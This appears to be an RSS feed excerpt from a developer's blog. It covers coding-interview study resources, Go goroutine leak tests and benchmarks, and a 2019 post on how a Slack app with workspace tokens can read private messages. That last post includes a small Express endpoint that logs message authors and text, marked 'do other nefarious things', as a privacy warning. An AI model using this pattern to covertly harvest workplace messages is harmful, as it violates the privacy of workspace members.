It&rsquo;s just an article, but it&rsquo;s a critical way to think about coding interviews
and how to approach them.
Since there are only 14 patterns, they are easy enough to remember
but also deep enough to apply to a myriad of different questions.</p>
<p>If you can master each of these, you will be well on your way to acing your coding interview.</p>
<h4 id="grokking-the-coding-interviewhttpswwweducativeiocoursesgrokking-coding-interview-patterns-python"><a href="https://www.educative.io/courses/grokking-coding-interview-patterns-python">Grokking the Coding Interview</a></h4>
<p>I used this course as a supplement to the 14 patterns.
It&rsquo;s actually created by the author of the 14 patterns article
but has alot of interactive questions you can go through to get ramped up quickly.
Unfortunately, it is quite expensive. But I found the cost to be worth it.</p>
<p>If you don&rsquo;t want to pay for the course, you can find almost all the same questions on Leetcode.
You just have to do some more digging and figure out some of the solutions on your own.</p>
<h4 id="blind-75httpsleetcodecomdiscussgeneral-discussion460599blind-75-leetcode-questions"><a href="https://leetcode.com/discuss/general-discussion/460599/blind-75-leetcode-questions">Blind 75</a></h4>
<p>By this point, the blind 75 have become a notorious list of Leetcode questions that <em>constantly</em> come up
in whiteboard style interviews.
But I <em>didn&rsquo;t</em> do all of them; I only did probably 20-30 or so. And I was very selective on <em>which</em> ones
I wanted to tackle. You&rsquo;ll notice that the are broken up into different categories.
In general, if you can solve 1 or 2 linked list question, you can solve almost all of them.
So I started skipping the ones that seemed to repeat or overlap.</p>
<p>This compounded with the 14 patterns since I was able to apply that knowledge alongside the
various data structures and algorithms identified by the blind 75 as the most important.</p>
<h4 id="cracking-the-coding-interviewhttpswwwcrackingthecodinginterviewcom"><a href="https://www.crackingthecodinginterview.com/">Cracking the Coding Interview</a></h4>
<p>I did open up Cracking the Coding Interview, what most would consider the bible of
whiteboard style interviews.
But I only refreshed myself on the most important parts, mostly the first few chapters.
I had read this book in the past (I think back in 2018?), and I didn&rsquo;t feel it was necessary
to go through the whole thing.
Again, I felt I was already getting alot of benefit from the 14 patterns and the blind 75.
So, as I skimmed the book, I skipped portions I felt overlapped with material I&rsquo;d already covered
or was too obscure the be relevant to my study plan.</p>
<h4 id="elements-of-programming-interviews-in-pythonhttpselementsofprogramminginterviewscomabout"><a href="https://elementsofprogramminginterviews.com/about/">Elements of Programming Interviews in Python</a></h4>
<p>I love Elements of Programming Interviews. It&rsquo;s <em>very</em> deep,
has alot of well thought out solutions, and is a great way to refresh your knowledge of a chosen language
(in my case, Python).</p>
<p>But it&rsquo;s a bit of a double edged sword; for my study plan, it was too much and I wanted to stay focused
on the 14 patterns, the blind 75, and grokking the coding interview.
So, instead, I used it as supplemental material, mostly to refresh myself on python3,
it&rsquo;s inner workings, and some tricks that are useful during interviews.</p>
<hr>
<p>All in all, if I had to only focus on 2 of these,
I&rsquo;d say the 14 patterns to ace any coding interview and the Blind 75 are the most important.
If you can master the patterns and have a good understanding of the Blind 75 (and the various categories),
then you&rsquo;ll be <em>95% of the way there</em>.</p>
<h2 id="2-get-a-referral">2. Get a referral</h2>
<p>Leverage your network! I hit up alot of people (just to see what&rsquo;s out there)
and it was massively successful. I&rsquo;d say my favorite interviews all came from referrals.
You also get the benefit of skipping the &ldquo;get to know you&rdquo; recruiter call.
So reach out to people on LinkedIn, previous co-workers</p>
<h2 id="3-company-values">3. Company values</h2>
<p>Every company, no matter how big or small, has some values they live by.
At Amazon, these are the leadership principles and you <em>will</em> be asked behavioral style questions
based on these company values.</p>
<p>Do your research! Come prepared to the interview knowing the company values.</p>
<h2 id="4-take-notes">4. Take notes</h2>
<p>I consistently took notes after each interview. This was a big win since I was doing 3-4 interviews
<em>per week</em>. After each interview I would note who I talked to, what we talked about, any advice they gave me
about the next round, etc.</p>
<h2 id="5-open-source">5. Open source</h2>
<p>Open source is a great way to show off your code, show off what you&rsquo;ve done,
and how you&rsquo;ve contributed to the broader open source world.</p>
<h2 id="6-story-telling">6. Story telling</h2>
<p>Story telling in interviews is huge.
A good story conveys your impact, what you did, the result of your actions,
and much much more.</p>
<p>I prefer 2 story telling methods:</p>
<h4 id="star-method">STAR method</h4>
<p>This stands for Situation. Task. Action. Result.
And people at Amazon love this for interviews (and for good reason).
It tells the person listen the kind of impact you had across a certain situation
and what you did to remedy it through your actions.</p>
<h4 id="man-in-the-hole-method">Man in the hole method</h4>
<p>The man in the hole story telling method is abit more nuanced.
You start from a &ldquo;good place&rdquo; and describe how some hole is getting dug out from under you.
This is essentially the &ldquo;situation&rdquo; from the STAR method.</p>
<p>But you keep digging and you keep digging. Until it seems that there is no way
you could possibly get out of the hole.</p>
<p>Then, you describe the actions you took to get you (or your team / organization) <em>out of that hole</em>.
It&rsquo;s a very powerful method for describing high impact from things you did or delivered.</p>
<hr>
<p>This advice you could really apply to <em>any</em> interview,
but going back to basics and studying hard was a really great way to do well in my interviews
and land a few different offers. Hope this was helpful! Until next time!!</p>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>Leaky Go Channels</title>
      <link>https://johncodes.com/posts/golang-performance/</link>
      <pubDate>Mon, 30 Mar 2020 00:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/posts/golang-performance/</guid>
      <description>These simple go tests check the &amp;ldquo;leaky-ness&amp;rdquo; of using channels in Go. There are two methods described here; one using both a local context, and the parent context. When tests are run against both, the LeakyAsync method runs faster, but fails the leak checker as goroutines are not resolved or cleaned up.
In a production system with possibly thousands of go routines being spun up, this could result in massive memory leaks and a deadlock situation in the go binary.</description>
      <content:encoded><![CDATA[<p>These simple go tests check the &ldquo;leaky-ness&rdquo; of using channels in Go.
There are two methods described here; one using both a local context, and the parent context.
When tests are run against both, the <code>LeakyAsync</code> method runs faster, but fails the leak checker
as goroutines are not resolved or cleaned up.</p>
<p>In a production system with possibly thousands of go routines being spun up,
this could result in massive memory leaks and a deadlock situation in the go binary.</p>
<p>it&rsquo;s recommended to use the <code>leakchecker</code> library to determine if goroutines get cleaned up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-golang" data-lang="golang"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">perform</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;context&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;math&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Selecting</span>(<span style="color:#a6e22e">parent</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{}) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Selecting within the infinite loop provides
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// control from the parent chan.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// If the parent closes, we we can exit the loop and do any cleanup
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">select</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">parent</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">default</span>:
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">math</span>.<span style="color:#a6e22e">MaxInt32</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Simulate an error that exits the process loop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">LeakyAsync</span>(<span style="color:#a6e22e">parent</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{}) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Start a go routine to read and block off the parent chan.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// If the parent chan closes, we can clean up within the go routine
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// without having to perform a &#34;select&#34; on each iteration
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// However, this go routine will never be garbage collected
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// if the parent chan does not close and any subsequent cleanup will
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// be left to leak
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">&lt;-</span><span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{}) {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">c</span>
</span></span><span style="display:flex;"><span>	}(<span style="color:#a6e22e">parent</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">math</span>.<span style="color:#a6e22e">MaxInt32</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Simulate an error that exits the process loop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ContextAsync</span>(<span style="color:#a6e22e">parentCtx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Generate a child context from a passed in parent context.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// If the parent is closed or canceled,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// the child will also be closed.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// We can then safely start a go routine that will block on the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// child&#39;s Done channel yet will still continue if the parent is canceled.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">cancel</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WithCancel</span>(<span style="color:#a6e22e">parentCtx</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">cancel</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>	}(<span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">math</span>.<span style="color:#a6e22e">MaxInt32</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Simulate an error that exits the process loop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-golang" data-lang="golang"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">perform</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;context&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;testing&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/fortytw2/leaktest&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">TestSelecting</span>(<span style="color:#a6e22e">t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">testing</span>.<span style="color:#a6e22e">T</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leakChecker</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">leaktest</span>.<span style="color:#a6e22e">Check</span>(<span style="color:#a6e22e">t</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{}, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Selecting</span>(<span style="color:#a6e22e">c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leakChecker</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span> <span style="color:#f92672">&lt;-</span> <span style="color:#66d9ef">struct</span>{}{}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">BenchmarkSelecting</span>(<span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">testing</span>.<span style="color:#a6e22e">B</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">n</span> &lt; <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">N</span>; <span style="color:#a6e22e">n</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{})
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Selecting</span>(<span style="color:#a6e22e">c</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">TestLeakyAsync</span>(<span style="color:#a6e22e">t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">testing</span>.<span style="color:#a6e22e">T</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leakChecker</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">leaktest</span>.<span style="color:#a6e22e">Check</span>(<span style="color:#a6e22e">t</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{}, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">LeakyAsync</span>(<span style="color:#a6e22e">c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leakChecker</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span> <span style="color:#f92672">&lt;-</span> <span style="color:#66d9ef">struct</span>{}{}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">BenchmarkLeakyAsync</span>(<span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">testing</span>.<span style="color:#a6e22e">B</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">n</span> &lt; <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">N</span>; <span style="color:#a6e22e">n</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{})
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">LeakyAsync</span>(<span style="color:#a6e22e">c</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">TestContextAsync</span>(<span style="color:#a6e22e">t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">testing</span>.<span style="color:#a6e22e">T</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leakChecker</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">leaktest</span>.<span style="color:#a6e22e">Check</span>(<span style="color:#a6e22e">t</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">cancel</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WithCancel</span>(<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Background</span>())
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ContextAsync</span>(<span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leakChecker</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cancel</span>()
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">BenchmarkContextAsync</span>(<span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">testing</span>.<span style="color:#a6e22e">B</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">n</span> &lt; <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">N</span>; <span style="color:#a6e22e">n</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WithCancel</span>(<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Background</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ContextAsync</span>(<span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Run the test suite with the leakchecker library</p>
<pre tabindex="0"><code>‚ùØ go test -v
=== RUN   TestSelecting
done checking leak
--- PASS: TestSelecting (11.30s)
=== RUN   TestLeakyAsync
    TestLeakyAsync: leaktest.go:132: leaktest: timed out checking goroutines
    TestLeakyAsync: leaktest.go:150: leaktest: leaked goroutine: goroutine 25 [chan receive]:
        perform.LeakyAsync.func1(0xc00008c1e0)
        	/Users/jmcbride/workspace/channels-testing/perform.go:37 +0x34
        created by perform.LeakyAsync
        	/Users/jmcbride/workspace/channels-testing/perform.go:36 +0x3f
--- FAIL: TestLeakyAsync (5.57s)
=== RUN   TestContextAsync
--- PASS: TestContextAsync (0.57s)
</code></pre><p>Run the benchmarks with <code>bench</code> and <code>benchmem</code> to see performance</p>
<pre tabindex="0"><code>‚ùØ go test -v -bench=.  -benchmem -run &#34;Bench*&#34;
goos: darwin
goarch: amd64
pkg: perform
BenchmarkSelecting
BenchmarkSelecting-8      	       1	10114375732 ns/op	     104 B/op	       2 allocs/op
BenchmarkLeakyAsync
BenchmarkLeakyAsync-8     	       2	 585489776 ns/op	     704 B/op	       3 allocs/op
BenchmarkContextAsync
BenchmarkContextAsync-8   	       2	 570398894 ns/op	     976 B/op	       9 allocs/op
PASS
ok  	perform	13.655s
</code></pre><p><code>LeakyAsync</code> is roughly 2 times faster. But fails the leak checker test as the goroutine is not resolved.</p>
<p><code>Selecting</code> is slow because it performs a <code>select</code> on <em>every</em> iteration of the for loop.</p>
<p><code>ContextAsync</code> is the best of both worlds. We don&rsquo;t have to do a select within the <code>for</code> loop, yet we avoid a go routine
leak.</p>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>Slack Is Always Watching ...</title>
      <link>https://johncodes.com/posts/slack-is-watching/</link>
      <pubDate>Mon, 21 Jan 2019 21:18:06 -0700</pubDate>
      
      <guid>https://johncodes.com/posts/slack-is-watching/</guid>
      <description>(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed) TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.
In today&amp;rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as &amp;ldquo;just the world we live in&amp;rdquo;. But what if information was exposed that could be used to judge your work performance?</description>
      <content:encoded><![CDATA[<p>(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed)
TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.</p>
<p>In today&rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as &ldquo;just the world we live in&rdquo;. But what if information was exposed that could be used to judge your work performance? Or steal your company‚Äôs intellectual property?</p>
<p>In this post, I will show how a Slack app could potentially leverage the Slack API to snoop on all public and private messages in a Slack workspace.</p>
<h2 id="the-veil-of-privacy">The veil of privacy</h2>
<p>A slack private message is not truly private. It is only hidden behind a thin veil of secrecy. With a workspace API token in hand, someone could lift that veil and see all.</p>
<p>Here, with a short example, we will show how easily that can be done.</p>
<p>First, the workspace owner or admin (depending on permissions), must access the <a href="https://api.slack.com/">Slack API website</a>. There, they can build an app or give third party permissions to install a ‚Äúmarketplace‚Äù app. This is fairly straight forward and exposes several workspace tokens for the app to use. These are secret tokens, so they will be omitted in this example.</p>
<p>Next, the app builder must enable the <a href="https://api.slack.com/events/message">&ldquo;message&rdquo; workspace event.</a> If I was a nefarious third-party app builder, I would simply request various permissions related to channel, im, or group &ldquo;history&rdquo;. For a full list of events and their permission scope, see <a href="https://api.slack.com/docs/oauth-scopes">this list.</a></p>
<p>Next, if building the app, an endpoint must be designated for the API to send the event payload. This event triggers whenever a message is sent in a direct message channel or fulfills the event conditions. For a full description of the Slack API event loop, <a href="https://api.slack.com/events-api#the_event_loop">check this out.</a></p>
<p>Now that we have the API set up to send event payloads, lets build a small Node Express app with an endpoint to receive the event json.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Events API endpoint
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/events&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>)  =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">type</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;url_verification&#39;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// verifies events API endpoint 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">challenge</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">challenge</span> });
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;event_callback&#39;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Respond immediately to prevent a timeout error
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendStatus</span>(<span style="color:#ae81ff">200</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">event</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">event</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Print the message contents
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;message&#39;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;User: &#39;</span>, <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">user</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Text: &#39;</span>, <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">text</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// Do other nefarious things with events json
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>In this short node express endpoint, we can respond with the event token (necessary for verifying the app when challenged) and snoop on private messages. Let‚Äôs use <a href="https://ngrok.com/">ngork</a>, start the express app, and send a private message:</p>
<pre tabindex="0"><code>App listening on port 8080!
User:  UBB22VCKC
Text:  hello world
</code></pre><p>We can see that my Slack user ID is exposed and the message I sent is exposed. At this point, the app could do anything with this information.</p>
